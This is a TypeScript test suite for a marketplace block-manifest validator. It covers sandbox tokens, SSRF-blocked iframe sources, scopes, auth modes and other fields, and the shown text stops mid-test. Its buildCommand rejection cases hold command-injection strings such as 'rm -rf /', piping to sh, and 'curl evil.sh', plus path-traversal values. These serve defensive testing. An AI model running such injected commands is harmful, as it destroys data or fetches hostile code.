import { describe, expect, it } from 'vitest';
import {
  BlockManifestValidator,
  MANIFEST_TAGLINE_MAX_LENGTH,
} from '../block-manifest-validator.service';
import { TokenScope } from '~/shared/constants/token-scope.constants';
import { MARKETPLACE_CATEGORIES } from '~/server/services/blocks/marketplace-categories.constants';

const VALID_MANIFEST = {
  blockId: 'test-block',
  version: '1.0.0',
  name: 'Test Block',
  contentRating: 'g',
  renderMode: 'iframe',
  trustTier: 'unverified',
  scopes: ['models:read:self'],
  iframe: {
    src: 'https://blocks.civitai.com/test',
    minHeight: 200,
    maxHeight: null,
    resizable: true,
    sandbox: 'allow-scripts',
  },
};

// H-8: the validator gates iframe.src against the app's registered
// OauthClient.allowedOrigins. Tests that expect VALID_MANIFEST to pass must
// supply an AppContext whose allowedOrigins covers blocks.civitai.com — the
// bare-number form defaults allowedOrigins to [] and (correctly) rejects.
const APP_CTX = {
  allowedScopes: TokenScope.ModelsRead,
  allowedOrigins: ['https://blocks.civitai.com'],
};

describe('BlockManifestValidator', () => {
  it('accepts a fully valid manifest', () => {
    const result = BlockManifestValidator.validate(VALID_MANIFEST, APP_CTX);
    expect(result).toEqual({ valid: true });
  });

  // Canonical blockId rule: DNS-label-safe (becomes <blockId>.civit.ai).
  describe('blockId (canonical DNS-label rule)', () => {
    it('accepts a valid DNS-safe blockId', () => {
      const manifest = { ...VALID_MANIFEST, blockId: 'my-block' };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it.each([
      ['MyBlock', 'uppercase'],
      ['-x', 'leading hyphen'],
      ['x-', 'trailing hyphen'],
      ['ab', 'too short (<3)'],
      ['a'.repeat(41), 'too long (>40)'],
      ['1block', 'does not start with a letter'],
      ['my_block', 'underscore'],
      ['my block', 'space'],
    ])('rejects blockId %j (%s)', (blockId) => {
      const manifest = { ...VALID_MANIFEST, blockId };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.includes('blockId'))).toBe(true);
      }
    });

    it('accepts a 40-char blockId (boundary) and a 3-char one', () => {
      const max = 'a' + 'b'.repeat(38) + 'c'; // 40 chars
      expect(BlockManifestValidator.validate({ ...VALID_MANIFEST, blockId: max }, APP_CTX)).toEqual({
        valid: true,
      });
      expect(
        BlockManifestValidator.validate({ ...VALID_MANIFEST, blockId: 'abc' }, APP_CTX)
      ).toEqual({ valid: true });
    });
  });

  // Canonical version rule: semver x.y.z (optional -prerelease).
  describe('version (canonical semver rule)', () => {
    it.each(['1.0.0', '1.2.3-beta.1', '10.20.30', '0.0.1-rc.0'])(
      'accepts semver version %j',
      (version) => {
        const manifest = { ...VALID_MANIFEST, version };
        expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
      }
    );

    it.each(['1.0', 'latest', '1', 'v1.0.0', '1.0.0.0', ''])(
      'rejects non-semver version %j',
      (version) => {
        const manifest = { ...VALID_MANIFEST, version };
        const result = BlockManifestValidator.validate(manifest, APP_CTX);
        expect(result.valid).toBe(false);
        if (!result.valid) {
          expect(result.errors.some((e) => e.includes('version'))).toBe(true);
        }
      }
    );
  });

  it('rejects PascalCase scope strings', () => {
    const manifest = { ...VALID_MANIFEST, scopes: ['Models:Read:Self'] };
    const result = BlockManifestValidator.validate(manifest, TokenScope.ModelsRead);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.errors.some((e) => e.includes('lowercase'))).toBe(true);
    }
  });

  it('rejects sandbox combining allow-same-origin with allow-scripts at unverified tier', () => {
    const manifest = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, sandbox: 'allow-scripts allow-same-origin' },
    };
    const result = BlockManifestValidator.validate(manifest, TokenScope.ModelsRead);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      // either the token-allowlist rejection or the defense-in-depth combo check
      expect(
        result.errors.some((e) => e.includes('allow-same-origin') || e.includes('not allowed'))
      ).toBe(true);
    }
  });

  it('rejects sandbox containing allow-top-navigation', () => {
    const manifest = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, sandbox: 'allow-scripts allow-top-navigation' },
    };
    const result = BlockManifestValidator.validate(manifest, TokenScope.ModelsRead);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(
        result.errors.some(
          (e) => e.includes('allow-top-navigation') || e.includes('not allowed')
        )
      ).toBe(true);
    }
  });

  it('rejects allow-popups-to-escape-sandbox (boundary escape, allowlist miss)', () => {
    const manifest = {
      ...VALID_MANIFEST,
      iframe: {
        ...VALID_MANIFEST.iframe,
        sandbox: 'allow-scripts allow-popups-to-escape-sandbox',
      },
    };
    const result = BlockManifestValidator.validate(manifest, TokenScope.ModelsRead);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.errors.some((e) => e.includes('allow-popups-to-escape-sandbox'))).toBe(true);
    }
  });

  it('accepts allow-modals on verified tier but not unverified', () => {
    const unverified = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, sandbox: 'allow-scripts allow-modals' },
    };
    expect(
      BlockManifestValidator.validate(unverified, APP_CTX).valid
    ).toBe(false);

    const verified = { ...unverified, trustTier: 'verified' };
    expect(BlockManifestValidator.validate(verified, APP_CTX).valid).toBe(true);
  });

  // M-POPUPS (audit medium): allow-popups is dropped from the unverified tier
  // so an approved-but-unverified block can't window.open() a phishing URL
  // from a visually-trusted .civit.ai subdomain. Still allowed for verified.
  it('M-POPUPS: rejects allow-popups on the unverified tier', () => {
    const unverified = {
      ...VALID_MANIFEST,
      trustTier: 'unverified',
      iframe: { ...VALID_MANIFEST.iframe, sandbox: 'allow-scripts allow-popups' },
    };
    const result = BlockManifestValidator.validate(unverified, TokenScope.ModelsRead);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(
        result.errors.some(
          (e) => e.includes('allow-popups') || e.includes('not allowed')
        )
      ).toBe(true);
    }
  });

  it('M-POPUPS: still accepts allow-popups on the verified tier', () => {
    const verified = {
      ...VALID_MANIFEST,
      trustTier: 'verified',
      iframe: { ...VALID_MANIFEST.iframe, sandbox: 'allow-scripts allow-popups' },
    };
    // Pass the full AppContext (with allowedOrigins) — the H-8 origin gate
    // otherwise rejects on "no allowedOrigins registered" before sandbox check.
    expect(
      BlockManifestValidator.validate(verified, {
        allowedScopes: TokenScope.ModelsRead,
        allowedOrigins: ['https://blocks.civitai.com'],
      }).valid
    ).toBe(true);
  });

  it('rejects iframe heights outside the [40, 4000] envelope', () => {
    const tiny = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, minHeight: 10 },
    };
    expect(BlockManifestValidator.validate(tiny, TokenScope.ModelsRead).valid).toBe(false);

    const huge = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, maxHeight: 100000 },
    };
    expect(BlockManifestValidator.validate(huge, TokenScope.ModelsRead).valid).toBe(false);

    const inverted = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, minHeight: 500, maxHeight: 200 },
    };
    const result = BlockManifestValidator.validate(inverted, TokenScope.ModelsRead);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.errors.some((e) => e.includes('iframe.maxHeight must be ≥'))).toBe(true);
    }
  });

  it('rejects scopes the OAuth client does not allow', () => {
    const manifest = { ...VALID_MANIFEST, scopes: ['models:read:self', 'buzz:read:self'] };
    const result = BlockManifestValidator.validate(manifest, TokenScope.ModelsRead);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.errors.some((e) => e.includes('exceed OAuth client'))).toBe(true);
    }
  });

  // Canonical scope membership: a well-formed-but-unknown scope is rejected.
  it('rejects a well-formed but unknown block scope', () => {
    const manifest = { ...VALID_MANIFEST, scopes: ['models:read:all'] };
    const result = BlockManifestValidator.validate(manifest, TokenScope.ModelsRead);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(
        result.errors.some(
          (e) => e.includes('not a known block scope') && e.includes('models:read:all')
        )
      ).toBe(true);
    }
  });

  // Deprecation: the removed decorative scopes are now UNKNOWN, so a NEW/edited
  // manifest declaring one is rejected at registration/edit time (intended — an
  // existing approved app that historically declared one degrades gracefully at
  // MINT instead; see the block-tokens mint graceful-drop test).
  it.each([['media:read:owned'], ['block:settings:read'], ['block:settings:write']])(
    'rejects a manifest declaring the removed decorative scope %s',
    (removed) => {
      const manifest = { ...VALID_MANIFEST, scopes: [removed] };
      const result = BlockManifestValidator.validate(manifest, TokenScope.Full);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(
          result.errors.some(
            (e) => e.includes('not a known block scope') && e.includes(removed)
          )
        ).toBe(true);
      }
    }
  );

  it('accepts the known SKIP_OAUTH_CHECK scope apps:storage:read', () => {
    // apps:storage:read maps to SKIP_OAUTH_CHECK, so it passes the OAuth-bit gate
    // regardless of the client bitmask — but it must still be a KNOWN scope.
    const manifest = { ...VALID_MANIFEST, scopes: ['apps:storage:read'] };
    expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
  });

  it('rejects inline render mode on the unverified tier', () => {
    const manifest = { ...VALID_MANIFEST, renderMode: 'inline', trustTier: 'unverified' };
    const result = BlockManifestValidator.validate(manifest, TokenScope.ModelsRead);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.errors).toContain('INLINE_REQUIRES_VERIFIED_TIER');
    }
  });

  it('rejects iframe.src that is not https', () => {
    const manifest = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, src: 'http://blocks.civitai.com/test' },
    };
    const result = BlockManifestValidator.validate(manifest, TokenScope.ModelsRead);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.errors.some((e) => e.includes('iframe.src'))).toBe(true);
    }
  });

  it.each([
    'https://localhost/x',
    'https://127.0.0.1/x',
    'https://10.0.0.1/x',
    'https://192.168.1.1/x',
    'https://169.254.169.254/x',
    'https://172.16.0.1/x',
    'https://metadata.google.internal/x',
    'https://service.local/x',
    'https://hosted.internal/x',
    'https://example/x', // no dot — reject
  ])('rejects private/internal iframe.src %s (SSRF gate)', (badSrc) => {
    const manifest = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, src: badSrc },
    };
    expect(BlockManifestValidator.validate(manifest, TokenScope.ModelsRead).valid).toBe(false);
  });

  it('rejects assetBundleUrl pointing at private/internal hosts', () => {
    const manifest = {
      ...VALID_MANIFEST,
      assetBundleUrl: 'https://169.254.169.254/bundle.zip',
    };
    const result = BlockManifestValidator.validate(manifest, TokenScope.ModelsRead);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.errors.some((e) => e.includes('assetBundleUrl'))).toBe(true);
    }
  });

  it('accepts a public-DNS https iframe.src', () => {
    const manifest = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, src: 'https://blocks.civitai.com/test' },
    };
    expect(BlockManifestValidator.validate(manifest, APP_CTX).valid).toBe(true);
  });

  it('H-8: rejects iframe.src on an origin not in OauthClient.allowedOrigins', () => {
    const manifest = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, src: 'https://impostor.example.com/test' },
    };
    const result = BlockManifestValidator.validate(manifest, {
      allowedScopes: TokenScope.ModelsRead,
      allowedOrigins: ['https://blocks.civitai.com'],
    });
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.errors.some((e) => e.includes('iframe.src rejected'))).toBe(true);
    }
  });

  it('H-8: accepts iframe.src on an allowedOrigin', () => {
    const manifest = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, src: 'https://blocks.civitai.com/test' },
    };
    expect(
      BlockManifestValidator.validate(manifest, {
        allowedScopes: TokenScope.ModelsRead,
        allowedOrigins: ['https://blocks.civitai.com'],
      }).valid
    ).toBe(true);
  });

  it('H-8: rejects iframe.src when app has no allowedOrigins', () => {
    const manifest = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, src: 'https://blocks.civitai.com/test' },
    };
    const result = BlockManifestValidator.validate(manifest, {
      allowedScopes: TokenScope.ModelsRead,
      allowedOrigins: [],
    });
    expect(result.valid).toBe(false);
  });

  it('M-5: rejects whitespace-only sandbox attribute', () => {
    const manifest = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, sandbox: '   ' },
    };
    const result = BlockManifestValidator.validate(manifest, TokenScope.ModelsRead);
    expect(result.valid).toBe(false);
    if (!result.valid) {
      expect(result.errors.some((e) => e.includes('at least one token'))).toBe(true);
    }
  });

  it.each([
    'https://0x7f000001/x', // single hex IPv4
    'https://2130706433/x', // integer-form IPv4
  ])('B4: rejects dotless encoded IPv4 literal %s', (badSrc) => {
    const manifest = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, src: badSrc },
    };
    expect(BlockManifestValidator.validate(manifest, TokenScope.ModelsRead).valid).toBe(false);
  });

  it.each([
    'https://0x7f.0x0.0x0.0x1/x', // hex IPv4 literal
    'https://0177.0.0.1/x', // octal IPv4 literal
  ])('M-1: rejects encoded IP literals %s', (badSrc) => {
    const manifest = {
      ...VALID_MANIFEST,
      iframe: { ...VALID_MANIFEST.iframe, src: badSrc },
    };
    expect(BlockManifestValidator.validate(manifest, TokenScope.ModelsRead).valid).toBe(false);
  });

  // W10 — targets[].slotId validation (closes the pre-existing gap) + page field.
  describe('W10 targets[].slotId + page', () => {
    it('accepts a manifest with valid model-slot targets', () => {
      const manifest = {
        ...VALID_MANIFEST,
        targets: [{ slotId: 'model.sidebar_top' }, { slotId: 'model.below_images' }],
      };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it('rejects a target with an unknown slotId', () => {
      const manifest = {
        ...VALID_MANIFEST,
        targets: [{ slotId: 'model.does_not_exist' }],
      };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.includes('not a known slot'))).toBe(true);
      }
    });

    it('rejects the page slot used as a target (page is declared via the page field)', () => {
      const manifest = {
        ...VALID_MANIFEST,
        targets: [{ slotId: 'app.page' }],
      };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.includes('page slot'))).toBe(true);
      }
    });

    it('rejects a target missing slotId', () => {
      const manifest = { ...VALID_MANIFEST, targets: [{}] };
      expect(BlockManifestValidator.validate(manifest, APP_CTX).valid).toBe(false);
    });

    it('accepts a valid page descriptor', () => {
      const manifest = {
        ...VALID_MANIFEST,
        page: { path: '/', title: 'My App', icon: 'apps' },
      };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it('rejects page.path that does not start with /', () => {
      const manifest = { ...VALID_MANIFEST, page: { path: 'home', title: 'X' } };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.includes('page.path must start with'))).toBe(true);
      }
    });

    it('rejects a page with no path', () => {
      const manifest = { ...VALID_MANIFEST, page: { title: 'X' } };
      expect(BlockManifestValidator.validate(manifest, APP_CTX).valid).toBe(false);
    });

    it('rejects a page with no title', () => {
      const manifest = { ...VALID_MANIFEST, page: { path: '/' } };
      expect(BlockManifestValidator.validate(manifest, APP_CTX).valid).toBe(false);
    });

    it('rejects a page declaration with no iframe block', () => {
      const { iframe: _iframe, ...noIframe } = VALID_MANIFEST;
      const manifest = {
        ...noIframe,
        renderMode: 'inline',
        trustTier: 'verified',
        page: { path: '/', title: 'X' },
      };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.includes('must also declare an iframe'))).toBe(true);
      }
    });

    // W10 generation spend — optional page.buzzBudgetPerGen.
    it('accepts a page declaring a positive integer buzzBudgetPerGen', () => {
      const manifest = {
        ...VALID_MANIFEST,
        page: { path: '/', title: 'X', buzzBudgetPerGen: 200 },
      };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it('accepts a page that omits buzzBudgetPerGen (optional → platform default)', () => {
      const manifest = { ...VALID_MANIFEST, page: { path: '/', title: 'X' } };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it.each([
      [0, 'zero'],
      [-5, 'negative'],
      [12.5, 'non-integer'],
      ['200' as unknown as number, 'string'],
      [Infinity, 'Infinity'],
      [Number.NaN, 'NaN'],
    ])('rejects a %s buzzBudgetPerGen (%s)', (value) => {
      const manifest = {
        ...VALID_MANIFEST,
        page: { path: '/', title: 'X', buzzBudgetPerGen: value },
      };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.includes('buzzBudgetPerGen'))).toBe(true);
      }
    });

    // A value above the per-gen cap is NOT rejected at validation time — the
    // mint handler clamps it to BUZZ_BUDGET_CAP. The validator only enforces
    // shape (positive integer).
    it('accepts an above-cap buzzBudgetPerGen (clamped at mint, not rejected here)', () => {
      const manifest = {
        ...VALID_MANIFEST,
        page: { path: '/', title: 'X', buzzBudgetPerGen: 5000 },
      };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });
  });

  describe('config-as-code buildCommand + outputDir (CLI page-vite template)', () => {
    // Backward-compat: a manifest WITHOUT the two new fields still validates.
    it('accepts a manifest without buildCommand/outputDir (backward-compatible)', () => {
      expect(BlockManifestValidator.validate(VALID_MANIFEST, APP_CTX)).toEqual({ valid: true });
    });

    it.each([
      'npm run build',
      'pnpm run build',
      'yarn run build',
      'npm run build:prod',
      'pnpm run build-app_2',
      'vite build',
      'npx vite build',
    ])('accepts allowed buildCommand %j', (buildCommand) => {
      const manifest = { ...VALID_MANIFEST, buildCommand };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it.each([
      'npm run build; rm -rf /',
      'npm run build && curl evil.sh',
      'npm run build | sh',
      'npm run build $(whoami)',
      'npm run build `id`',
      'npm run build > /etc/passwd',
      'echo hi',
      'curl evil.com',
      'vite build --config ../../../etc',
      'npm install',
    ])('rejects unsafe/disallowed buildCommand %j', (buildCommand) => {
      const manifest = { ...VALID_MANIFEST, buildCommand };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.toLowerCase().includes('buildcommand'))).toBe(true);
      }
    });

    it('rejects an over-long buildCommand', () => {
      const manifest = { ...VALID_MANIFEST, buildCommand: 'npm run ' + 'a'.repeat(200) };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.includes('≤128'))).toBe(true);
      }
    });

    it('rejects a non-string buildCommand', () => {
      const manifest = { ...VALID_MANIFEST, buildCommand: 123 };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
    });

    it.each(['dist', 'build', 'out/web', 'public/assets'])(
      'accepts safe relative outputDir %j',
      (outputDir) => {
        const manifest = { ...VALID_MANIFEST, outputDir };
        expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
      }
    );

    it.each([
      '/abs',
      '../escape',
      'foo/../../etc',
      'foo/..',
      '..',
      'a\\b',
      'C:\\windows',
      'foo\0bar',
    ])('rejects unsafe outputDir %j', (outputDir) => {
      const manifest = { ...VALID_MANIFEST, outputDir };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.toLowerCase().includes('outputdir'))).toBe(true);
      }
    });

    it('still accepts both new fields together with the rest of a valid manifest', () => {
      const manifest = {
        ...VALID_MANIFEST,
        buildCommand: 'pnpm run build',
        outputDir: 'dist',
      };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    // The two new fields must NOT relax the existing server-owned gates.
    it('still rejects a private iframe.src even with valid buildCommand/outputDir', () => {
      const manifest = {
        ...VALID_MANIFEST,
        buildCommand: 'vite build',
        outputDir: 'dist',
        iframe: { ...VALID_MANIFEST.iframe, src: 'https://localhost/x' },
      };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.includes('iframe.src'))).toBe(true);
      }
    });
  });

  // W13 category-on-approve — the OPTIONAL marketplace `category`. Absent is
  // fine; present must be a MARKETPLACE_CATEGORIES member (single-sourced with
  // the const + the published schema's `category` enum).
  describe('category (optional marketplace taxonomy)', () => {
    it('accepts a manifest with NO category (optional)', () => {
      // VALID_MANIFEST declares no category.
      expect(BlockManifestValidator.validate(VALID_MANIFEST, APP_CTX)).toEqual({ valid: true });
    });

    it.each(MARKETPLACE_CATEGORIES.map((c) => [c] as const))(
      'accepts the valid category %j',
      (category) => {
        const manifest = { ...VALID_MANIFEST, category };
        expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
      }
    );

    // `[unknown, string]` keeps the table's mixed-type cases in ONE tuple shape;
    // otherwise each row infers its own tuple and the union is not assignable to
    // a single callback signature.
    it.each<[unknown, string]>([
      ['productivity', 'not in the taxonomy'],
      ['Generation', 'wrong case'],
      ['', 'empty string'],
      [42, 'non-string'],
      [null, 'null'],
    ])('rejects category %j (%s) with a clear error', (category) => {
      const manifest = { ...VALID_MANIFEST, category };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors.some((e) => e.startsWith('category must be one of'))).toBe(true);
      }
    });
  });

  describe('auth (optional credential opt-in)', () => {
    it.each(['block-token', 'oauth'])('accepts auth %j', (auth) => {
      expect(BlockManifestValidator.validate({ ...VALID_MANIFEST, auth }, APP_CTX)).toEqual({
        valid: true,
      });
    });

    it.each<[unknown]>([['session'], ['OAuth'], [''], [true], [null]])(
      'rejects auth %j with a clear error',
      (auth) => {
        const result = BlockManifestValidator.validate({ ...VALID_MANIFEST, auth }, APP_CTX);
        expect(result.valid).toBe(false);
        if (!result.valid) {
          expect(result.errors.some((e) => e.startsWith('auth must be one of'))).toBe(true);
        }
      }
    );
  });

  /**
   * `auth: "oauth"` × `apps:storage:*` — refused at submit, because the runtime cannot
   * serve it. An `auth: "oauth"` app is minted an OPAQUE OAuth access token when a viewer
   * is signed in, and every app-storage resolver re-verifies the RAW bearer with
   * `verifyBlockToken` (JWS + pinned `kid`), so the whole storage surface 401s for signed-in
   * viewers while still working for anonymous ones (who are minted a block JWT).
   *
   * 🔴 Each rejection pins the WHOLE normalised message, not a keyword. The message IS the
   * product of this guard — a reword that dropped the "what to do" half would leave a
   * keyword assertion green while recreating the original problem one layer up.
   */
  describe('auth "oauth" × apps:storage:* (app storage is block-token-only today)', () => {
    // 🔴 LITERALS, DELIBERATELY — neither the scope list nor the message is imported from
    // the code under test. A test that reads `APP_STORAGE_SCOPES` and
    // `oauthAppStorageConflictError` back out of the implementation asserts only that the
    // implementation equals itself: it would stay green through a message rewritten to
    // "invalid manifest", which is the exact failure this guard exists to prevent. The cost
    // is that a cosmetic reword fails here — pay it; the text IS the contract with the app
    // author, and a machine-readable claim about it is worth one deliberate edit.
    //
    // It also makes this suite compile and fail on its ASSERTION at the pre-change ref,
    // rather than on a missing export.
    const STORAGE_SCOPES = [
      'apps:storage:read',
      'apps:storage:write',
      'apps:storage:shared:read',
      'apps:storage:shared:write',
    ];

    const expectedRefusal = (named: string) =>
      `auth "oauth" cannot be combined with app storage: this manifest declares ${named}. ` +
      `App storage is served to a BLOCK TOKEN only today — an auth "oauth" app is minted an ` +
      `opaque OAuth access token instead of a block JWT, and the app-storage resolvers ` +
      `re-verify that bearer as a block JWT, so every storage read and write returns 401 as ` +
      `soon as a viewer signs in (it appears to work while signed out, because an anonymous ` +
      `viewer is still minted a block JWT). Fix it either way: set "auth" to "block-token", ` +
      `or remove ${named} from "scopes". This is a CURRENT limitation, not a permanent one — ` +
      `teaching the app-storage resolvers to accept the claims the block-scope middleware ` +
      `has already resolved is the intended fix, and this rule is expected to be lifted then.`;

    it.each(STORAGE_SCOPES)('rejects auth "oauth" with %s declared', (storageScope) => {
      const result = BlockManifestValidator.validate(
        {
          ...VALID_MANIFEST,
          auth: 'oauth',
          scopes: ['models:read:self', storageScope],
          // `apps:storage:shared:write` is a SENSITIVE scope, so it needs a justification
          // or the sensitive-scope rule reports its own (different) error. Supplied for
          // every case so this test is only ever red for the reason it names.
          scopeJustifications: { [storageScope]: 'Persist the user’s saved presets.' },
        },
        APP_CTX
      );
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors).toContain(expectedRefusal(storageScope));
      }
    });

    it('names EVERY conflicting scope, in declaration order, in one error', () => {
      const declared = ['apps:storage:shared:read', 'apps:storage:write'];
      const result = BlockManifestValidator.validate(
        { ...VALID_MANIFEST, auth: 'oauth', scopes: ['models:read:self', ...declared] },
        APP_CTX
      );
      expect(result.valid).toBe(false);
      if (!result.valid) {
        expect(result.errors).toContain(expectedRefusal(declared.join(', ')));
      }
    });

    /**
     * The whole-string pin above is exact but BRITTLE: the legitimate way past it is to
     * reword the message and update the literal in the same commit. This is the belt that
     * survives that edit — it reads the message the validator ACTUALLY produced (never the
     * local literal, which would only assert that a string contains its own substrings) and
     * requires the four things that make the refusal actionable rather than merely correct.
     *
     * 🔴 A refusal saying only "invalid" recreates the original problem one layer up: a
     * silent catastrophic runtime failure becomes a submit-time dead end with no way out.
     */
    it('the refusal names the scope, the auth mode, both exits, and that the limit is current', () => {
      const result = BlockManifestValidator.validate(
        {
          ...VALID_MANIFEST,
          auth: 'oauth',
          scopes: ['models:read:self', 'apps:storage:shared:read'],
        },
        APP_CTX
      );
      expect(result.valid).toBe(false);
      const message = result.valid
        ? ''
        : (result.errors.find((e) => e.includes('apps:storage:shared:read')) ?? '');
      // The conflicting scope, so the author knows WHICH declaration to change.
      expect(message).toContain('apps:storage:shared:read');
      // The auth mode, so they know it is the PAIR that is refused, not the scope alone.
      expect(message).toContain('auth "oauth"');
      // Both exits — either one alone leaves an author stuck.
      expect(message).toContain('block-token');
      expect(message).toContain('"scopes"');
      // NOT permanently unsupported: teaching the resolvers to take middleware-resolved
      // claims is the intended direction, and the message must not foreclose it.
      expect(message.toLowerCase()).toContain('not a permanent one');
      expect(message.toLowerCase()).not.toContain('never be supported');
    });

    // THE JWT PATH IS UNCHANGED — the regression this guard could plausibly cause. Every
    // storage scope stays declarable on the credential shape that actually serves it, and
    // an omitted `auth` (the default, and what every shipped app carries) is block-token.
    it.each(STORAGE_SCOPES)('still ACCEPTS auth "block-token" with %s', (storageScope) => {
      expect(
        BlockManifestValidator.validate(
          {
            ...VALID_MANIFEST,
            auth: 'block-token',
            scopes: ['models:read:self', storageScope],
            scopeJustifications: { [storageScope]: 'Persist the user’s saved presets.' },
          },
          APP_CTX
        )
      ).toEqual({ valid: true });
    });

    it.each(STORAGE_SCOPES)('still ACCEPTS an OMITTED auth with %s', (storageScope) => {
      const manifest = {
        ...VALID_MANIFEST,
        scopes: ['models:read:self', storageScope],
        scopeJustifications: { [storageScope]: 'Persist the user’s saved presets.' },
      };
      expect('auth' in manifest).toBe(false);
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    // And `auth: "oauth"` is still a legal mode for an app that does NOT want storage —
    // the guard is scoped to the conflict, it does not retire the OAuth mode. (The
    // `accepts auth %j` case above covers this too; restated here so deleting the guard's
    // own describe block cannot take the "oauth is still allowed" claim with it.)
    it('still ACCEPTS auth "oauth" with no apps:storage:* scope', () => {
      // `collections:read:self` is SKIP_OAUTH_CHECK and NOT sensitive, so it needs neither
      // an OAuth bit nor a justification — it isolates "a second, non-storage scope".
      expect(
        BlockManifestValidator.validate(
          {
            ...VALID_MANIFEST,
            auth: 'oauth',
            scopes: ['models:read:self', 'collections:read:self'],
          },
          APP_CTX
        )
      ).toEqual({ valid: true });
    });
  });

  // The OPTIONAL one-line store `tagline`. Absent is fine (the store shows no
  // tagline); present must be a string whose TRIMMED length is 1..140. This is
  // the AUTHORITATIVE gate — the published JSON schema is a shape hint.
  describe('tagline (optional store one-liner)', () => {
    it('accepts a manifest with NO tagline (optional, backward-compatible)', () => {
      // VALID_MANIFEST declares no tagline.
      expect(BlockManifestValidator.validate(VALID_MANIFEST, APP_CTX)).toEqual({ valid: true });
    });

    it('accepts a normal tagline', () => {
      const manifest = { ...VALID_MANIFEST, tagline: 'The fastest way to remix a model' };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it('accepts a tagline EXACTLY at the cap', () => {
      const manifest = { ...VALID_MANIFEST, tagline: 'a'.repeat(MANIFEST_TAGLINE_MAX_LENGTH) };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it('accepts an over-cap tagline whose TRIMMED length fits (padding is not counted)', () => {
      const manifest = {
        ...VALID_MANIFEST,
        tagline: `   ${'a'.repeat(MANIFEST_TAGLINE_MAX_LENGTH)}   `,
      };
      expect(BlockManifestValidator.validate(manifest, APP_CTX)).toEqual({ valid: true });
    });

    it('rejects a tagline one char OVER the cap', () => {
      const manifest = { ...VALID_MANIFEST, tagline: 'a'.repeat(MANIFEST_TAGLINE_MAX_LENGTH + 1) };
      const result = BlockManifestValidator.validate(manifest, APP_CTX);
      expect(result.valid).toBe(false);
      if (!result.valid) {
